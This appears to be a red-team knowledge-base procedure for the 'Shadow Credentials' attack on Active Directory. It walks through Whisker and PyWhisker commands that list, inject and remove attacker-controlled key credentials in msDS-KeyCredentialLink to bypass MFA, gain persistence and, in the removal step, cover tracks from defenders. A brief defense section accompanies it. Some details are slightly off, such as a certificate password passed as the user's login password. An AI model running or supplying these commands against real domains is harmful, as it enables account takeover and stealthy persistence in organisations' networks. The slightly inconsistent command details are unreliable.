---
id: 04096923-a0f1-4a0c-8c15-897207318180
name: Shadow-Credentials-for-Windows-Hello
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:06.273418+00:00'
updated_at: '2023-04-10T20:26:09.558579+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - >-
    [[techniques/Credentials from Password Stores|T1555 - Credentials from
    Password Stores]]
  - >-
    [[techniques/Modify Authentication Process|T1556 - Modify Authentication
    Process]]
  - '[[techniques/Unsecured Credentials|T1552 - Unsecured Credentials]]'
sub_techniques:
  - >-
    [[sub-techniques/Domain Controller Authentication|T1556.001 - Domain
    Controller Authentication]]
  - '[[sub-techniques/Private Keys|T1552.004 - Private Keys]]'
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Shadow Credentials]]'
commands:
  - '[[commands/whisker-list-key-credentials]]'
  - '[[commands/whisker-add-key-credential-samname]]'
  - '[[commands/whisker-add-key-credential-computername]]'
  - '[[commands/whisker-remove-key-credential]]'
  - '[[commands/pywhisker-list-key-credentials]]'
  - '[[commands/pywhisker-add-key-credential]]'
  - '[[commands/pywhisker-remove-key-credential]]'
platforms:
  - Windows
  - Active Directory
tools:
  - '[[tools/Whisker]]'
  - '[[tools/PyWhisker]]'
validated: true
---

# Shadow-Credentials-for-Windows-Hello

## Summary

This procedure demonstrates how to manipulate the msDS-KeyCredentialLink attribute in Active Directory to add, list, or remove key credentials associated with Windows Hello for Business. By linking an attacker's public key to a victim's account, an attacker can authenticate using the private key, bypassing traditional MFA and achieving persistence or credential access in a domain environment.

## Description

Windows Hello for Business enables biometric authentication on Windows 10/11 devices using facial recognition or fingerprints, storing credentials as key pairs in Active Directory via the msDS-KeyCredentialLink attribute. Attackers with sufficient AD privileges can modify this attribute to inject their own key credentials, simulating a legitimate device enrollment. This allows offline cracking or direct use of the private key for authentication to services accepting Windows Hello credentials. The technique requires domain admin or equivalent rights and can be executed using Windows-based Whisker.exe or Python-based PyWhisker. It targets Active Directory environments with Windows Hello enabled, enabling stealthy persistence without altering passwords.

## Requirements

1. Domain Admin or equivalent privileges to modify user/computer objects in Active Directory.
2. Access to a Domain Controller or network connectivity to one.
3. Installation of Whisker.exe (Windows) or PyWhisker (Python 3 on Linux/Windows).
4. A PFX certificate file with private key for adding credentials (generate via OpenSSL or similar).
5. Valid domain credentials for authentication.

## Defense

- Implement least privilege access: Restrict modifications to msDS-KeyCredentialLink to authorized service accounts only.
- Monitor Active Directory for attribute changes using tools like Microsoft Advanced Threat Analytics or custom auditing on msDS-KeyCredentialLink.
- Enable MFA with certificate-based authentication that requires device attestation.
- Regularly audit key credentials on high-privilege accounts and remove unused ones.

## Objectives

1. Extract existing key credentials from a target user or computer object to identify valid Windows Hello enrollments.
2. Add an attacker-controlled key credential to enable unauthorized authentication and bypass MFA.
3. Remove credentials to clean up traces or disrupt legitimate access.
4. Achieve persistence in the domain by maintaining backdoor access via injected keys.

## Instructions

This procedure covers operations using both Whisker (Windows executable) and PyWhisker (Python script). Choose based on your environment. Prerequisites include generating a PFX file for additions (e.g., using OpenSSL: `openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes; openssl pkcs12 -export -out cert.pfx -inkey key.pem -in cert.pem`).

### Step 1: List Existing Key Credentials for Target

**Context**: Enumerate the msDS-KeyCredentialLink attribute to view current key credentials, identifying device IDs and public keys for analysis or removal. This step verifies the target's current state and reveals potential existing backdoors.

For Whisker:
**Command** ([[commands/whisker-list-key-credentials]]):
```bash
Whisker.exe list /target:$_TARGET_NAME
```

> Replace $_TARGET_NAME with the target user or computer SAM account (e.g., computername$). This queries AD for all msDS-KeyCredentialLink entries.

For PyWhisker:
**Command** ([[commands/pywhisker-list-key-credentials]]):
```bash
python3 pywhisker.py -d "$_DOMAIN" -u "$_USERNAME" -p "$_PASSWORD" --target "$_TARGET_NAME" --action "list"
```

> Provide domain credentials to authenticate the query.

**Expected Output**: A list of key credential entries, including DeviceID GUIDs, public keys, and timestamps. Success if entries are displayed without authentication errors.

### Step 2: Add a New Key Credential to the Target

**Context**: Generate or use a PFX file to add a new key credential, linking the attacker's public key to the target. This simulates a new device enrollment, allowing future authentication with the private key.

For Whisker (using SAM name):
**Command** ([[commands/whisker-add-key-credential-samname]]):
```bash
Whisker.exe add /target:"$_TARGET_SAMNAME" /domain:"$_FQDN_DOMAIN" /dc:"$_DOMAIN_CONTROLLER" /path:"$_PFX_PATH" /password:"$_PFX_PASSWORD"
```

> This generates a key pair if needed and adds the credential.

For Whisker (using computer name):
**Command** ([[commands/whisker-add-key-credential-computername]]):
```bash
Whisker.exe add /target:$_TARGET_COMPUTER$ [/domain:$_DOMAIN /dc:$_DC /path:$_PFX_PATH /password:$_PFX_PASSWORD]
```

For PyWhisker:
**Command** ([[commands/pywhisker-add-key-credential]]):
```bash
python3 pywhisker.py -d "$_FQDN_DOMAIN" -u "$_USERNAME" -p "$_CERT_PASSWORD" --target "$_TARGET_SAMNAME" --action "add"
```

**Expected Output**: Confirmation of successful addition, such as "Key credential added successfully" or updated attribute value. Verify by re-listing credentials.

### Step 3: Remove a Key Credential from the Target

**Context**: Remove a specific key credential by DeviceID to eliminate traces or revoke access. This is useful post-exploitation cleanup or to disrupt defender analysis.

For Whisker:
**Command** ([[commands/whisker-remove-key-credential]]):
```bash
Whisker.exe remove /target:$_TARGET_NAME /domain:$_DOMAIN /dc:$_DOMAIN_CONTROLLER /remove:$_DEVICE_ID
```

> $_DEVICE_ID is the GUID from the list step.

For PyWhisker:
**Command** ([[commands/pywhisker-remove-key-credential]]):
```bash
python3 pywhisker.py -d "$_DOMAIN" -u "$_USERNAME" -p "$_PASSWORD" --target "$_TARGET_NAME" --action "remove" --device-id "$_DEVICE_ID"
```

**Expected Output**: Confirmation like "Key credential removed" with no errors. Re-list to confirm absence.

### Step 4: Verify and Use the Injected Credential

**Context**: After addition, export the private key from the PFX and test authentication (e.g., using certutil or OpenSSL to extract, then auth with tools like Rubeus for Kerberos). If unsuccessful, check AD replication and permissions.

**Command** (No specific command; use [[commands/pywhisker-list-key-credentials]] to verify):
```bash
# Re-run list to confirm addition
```

**Expected Output**: New credential appears in the list with attacker's public key details.

If the target uses the private key for auth, attempt login to a service (e.g., RDP with certificate) to validate access.
